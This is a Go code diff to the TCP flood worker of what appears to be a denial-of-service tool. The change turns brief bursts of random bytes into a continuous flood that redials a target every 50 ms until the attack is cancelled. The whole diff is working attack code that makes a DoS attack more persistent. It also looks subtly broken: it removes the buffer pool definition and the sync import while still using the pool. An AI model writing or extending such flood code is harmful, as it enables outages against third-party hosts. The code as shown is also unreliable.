@@ -3,21 +3,15 @@ package tcp
 import (
 	"context"
 	"math/rand"
-	"sync"
 	"time"
 
 	core "github.com/sammwyy/mikumikubeam/internal/engine"
 	"github.com/sammwyy/mikumikubeam/internal/netutil"
 )
 
-// bufPool reuses byte buffers to reduce GC pressure under high throughput.
-var bufPool = sync.Pool{
-	New: func() any {
-		b := make([]byte, 512)
-		return &b
-	},
-}
-
+// floodWorker keeps a TCP connection open and streams data over it.
+// When the connection breaks it closes it and dials a fresh one immediately,
+// continuing to flood until the attack context is cancelled.
 type floodWorker struct{}
 
 func NewFloodWorker() *floodWorker { return &floodWorker{} }
@@ -34,22 +28,13 @@ func (w *floodWorker) Fire(ctx context.Context, params core.AttackParams, p core
 	if p.Host != "" {
 		pptr = &p
 	}
-	conn, err := netutil.DialedTCPClient(ctx, "tcp", host, port, pptr)
-	if err != nil {
-		return nil
-	}
-	defer conn.Close()
 
-	// Send log only if connection was successful and verbose is enabled
-	core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)
-
-	// Write random bytes (packet-size or 512 default)
 	size := params.PacketSize
 	if size <= 0 {
 		size = 512
 	}
 
-	// Get buffer from pool, resize if needed
+	// Get buffer from pool, resize if needed.
 	bufPtr := bufPool.Get().(*[]byte)
 	buf := *bufPtr
 	if len(buf) < size {
@@ -62,23 +47,29 @@ func (w *floodWorker) Fire(ctx context.Context, params core.AttackParams, p core
 		bufPool.Put(bufPtr)
 	}()
 
-	// math/rand is ~100x faster than crypto/rand for random fill data.
-	// Security-grade randomness is unnecessary for stress test payloads.
-	rand.Read(buf)
-	_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
-	_, _ = conn.Write(buf)
-	// Optionally send a few bursts
-	bursts := minInt(3, 1+rand.Intn(3))
-	for i := 0; i < bursts; i++ {
-		rand.Read(buf)
-		_, _ = conn.Write(buf)
+	// Loop until the attack is cancelled, redialing whenever the connection dies.
+	for ctx.Err() == nil {
+		conn, err := netutil.DialedTCPClient(ctx, "tcp", host, port, pptr)
+		if err != nil {
+			select {
+			case <-ctx.Done():
+				return nil
+			case <-time.After(50 * time.Millisecond):
+			}
+			continue
+		}
+
+		core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)
+
+		// Stream data on the open connection until it breaks or the attack ends.
+		for ctx.Err() == nil {
+			_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
+			if _, err := conn.Write(buf); err != nil {
+				break
+			}
+			rand.Read(buf) // fresh random payload every packet
+		}
+		conn.Close()
 	}
 	return nil
-}
-
-func minInt(a, b int) int {
-	if a < b {
-		return a
-	}
-	return b
 }
